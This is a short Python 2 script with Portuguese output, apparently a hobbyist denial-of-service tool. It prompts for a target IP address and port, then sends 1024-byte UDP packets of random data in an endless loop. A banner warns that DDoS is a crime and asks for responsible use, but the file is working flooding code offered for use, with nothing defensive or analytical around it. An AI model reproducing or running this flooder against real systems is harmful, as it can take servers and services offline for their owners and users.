import socket
import random
print "\n######################################################################\n"
print "Seja bem vindo!"
print "Lembrando que DDOS eh CRIME, use este script com responsabilidade!"
print "Desenvolvido por: ArthurHMES"
print "\n######################################################################\n"
destino_ip = raw_input("Alvo: ")
destino_port = int(input ("Porta: "))


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

packet = random._urandom(1024)

while True:
    print "Vai de base... kkk"
    sock.sendto (packet,  (destino_ip, destino_port))